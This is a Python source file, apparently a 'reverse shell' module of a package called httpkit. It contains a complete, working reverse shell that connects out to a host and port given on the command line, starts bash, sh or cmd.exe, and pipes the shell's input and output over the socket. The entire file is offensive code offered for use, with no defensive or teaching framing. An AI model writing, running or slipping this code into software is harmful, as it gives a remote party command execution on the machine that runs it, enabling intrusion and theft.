"""Reverse shell module for httpkit.

This module provides functionality to establish a reverse shell connection
to a remote host and port.
"""

import socket
import subprocess
import threading
import argparse
import sys
import os
from typing import Optional


class ReverseShell:
    """A reverse shell client that connects to a remote host and spawns a shell."""
    
    def __init__(self, host: str, port: int):
        """Initialize the reverse shell client.
        
        Args:
            host: The remote host to connect to
            port: The remote port to connect to
        """
        self.host = host
        self.port = port
        self.socket: Optional[socket.socket] = None
        self.process: Optional[subprocess.Popen] = None
        
    def connect(self) -> bool:
        """Establish connection to the remote host.
        
        Returns:
            True if connection successful, False otherwise
        """
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.connect((self.host, self.port))
            print(f"Connected to {self.host}:{self.port}")
            return True
        except Exception as e:
            print(f"Failed to connect to {self.host}:{self.port}: {e}")
            # Clean up socket on failure
            if self.socket:
                try:
                    self.socket.close()
                except:
                    pass
                self.socket = None
            return False
    
    def spawn_shell(self):
        """Spawn a bash shell and redirect I/O to the socket."""
        if not self.socket:
            print("No active connection")
            return
            
        try:
            # Determine the shell to use
            shell = "/bin/bash"
            if not os.path.exists(shell):
                shell = "/bin/sh"
            if not os.path.exists(shell):
                shell = "cmd.exe" if os.name == 'nt' else "/bin/sh"
            
            # Start the shell process
            self.process = subprocess.Popen(
                [shell],
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                shell=False
            )
            
            # Start threads to handle I/O
            threading.Thread(target=self._handle_socket_to_process, daemon=True).start()
            threading.Thread(target=self._handle_process_to_socket, daemon=True).start()
            
            # Wait for the process to complete
            self.process.wait()
            
        except Exception as e:
            print(f"Error spawning shell: {e}")
        finally:
            self.cleanup()
    
    def _handle_socket_to_process(self):
        """Handle data from socket to process stdin."""
        try:
            while self.process and self.process.poll() is None and self.socket:
                try:
                    self.socket.settimeout(1.0)  # Non-blocking with timeout
                    data = self.socket.recv(1024)
                    if not data:
                        break
                    if self.process and self.process.stdin:
                        self.process.stdin.write(data)
                        self.process.stdin.flush()
                except socket.timeout:
                    continue
                except Exception:
                    break
        except Exception as e:
            print(f"Error in socket to process handler: {e}")
    
    def _handle_process_to_socket(self):
        """Handle data from process stdout/stderr to socket."""
        try:
            import select
            import os
            
            while self.process and self.process.poll() is None and self.socket:
                try:
                    # Use select to check if data is available
                    ready, _, _ = select.select([self.process.stdout, self.process.stderr], [], [], 1.0)
                    
                    for stream in ready:
                        if stream == self.process.stdout:
                            data = os.read(stream.fileno(), 1024)
                            if data:
                                self.socket.send(data)
                        elif stream == self.process.stderr:
                            data = os.read(stream.fileno(), 1024)
                            if data:
                                self.socket.send(data)
                                
                except Exception:
                    break
                    
        except Exception as e:
            print(f"Error in process to socket handler: {e}")
    
    def cleanup(self):
        """Clean up resources."""
        if self.process:
            try:
                self.process.terminate()
                self.process.wait(timeout=5)
            except:
                try:
                    self.process.kill()
                except:
                    pass
            finally:
                self.process = None
        
        if self.socket:
            try:
                self.socket.close()
            except:
                pass
            finally:
                self.socket = None


def establish_reverse_shell(host: str, port: int) -> bool:
    """Establish a reverse shell connection to the specified host and port.
    
    Args:
        host: The remote host to connect to
        port: The remote port to connect to
        
    Returns:
        True if connection was successful, False otherwise
    """
    shell = ReverseShell(host, port)
    
    if shell.connect():
        print(f"Reverse shell established to {host}:{port}")
        shell.spawn_shell()
        return True
    else:
        print(f"Failed to establish reverse shell to {host}:{port}")
        return False


def main():
    """Main entry point for the reverse shell tool."""
    parser = argparse.ArgumentParser(description="HTTPKit Reverse Shell Tool")
    parser.add_argument("host", help="Remote host to connect to")
    parser.add_argument("port", type=int, help="Remote port to connect to")
    parser.add_argument("--timeout", type=int, default=30, 
                        help="Connection timeout in seconds (default: 30)")
    
    args = parser.parse_args()
    
    try:
        # Set socket timeout
        socket.setdefaulttimeout(args.timeout)
        
        print(f"Attempting to establish reverse shell to {args.host}:{args.port}")
        success = establish_reverse_shell(args.host, args.port)
        
        if success:
            print("Reverse shell session ended")
            sys.exit(0)
        else:
            print("Failed to establish reverse shell")
            sys.exit(1)
            
    except KeyboardInterrupt:
        print("\nInterrupted by user")
        sys.exit(1)
    except Exception as e:
        print(f"Error: {e}")
        sys.exit(1)


if __name__ == "__main__":
    main()